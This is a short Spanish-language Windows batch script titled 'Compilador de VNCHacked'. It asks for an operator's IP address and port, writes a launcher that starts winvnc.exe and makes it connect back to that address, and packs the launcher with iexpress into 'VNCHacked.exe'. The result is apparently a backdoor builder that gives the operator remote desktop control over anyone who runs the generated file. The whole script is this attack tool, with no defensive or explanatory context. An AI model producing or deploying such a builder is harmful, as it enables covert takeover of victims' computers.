@echo off
title Compilador de VNCHacked
set /p ip=Introduzca la IP del equipo con VNCHacker o UltraVNC client: 
set /p puerto=Introduzca el puerto de VNCHacker (por defecto 5900): 
if not defined puerto set puerto=5900
echo cmd /c "start winvnc.exe -run && start winvnc.exe -connect %ip%::%puerto%">vnc.bat
iexpress /n VNCHacked.sed
del /q vnc.bat
cls
echo Finalizado. Se ha generado "VNCHacked.exe".
pause
exit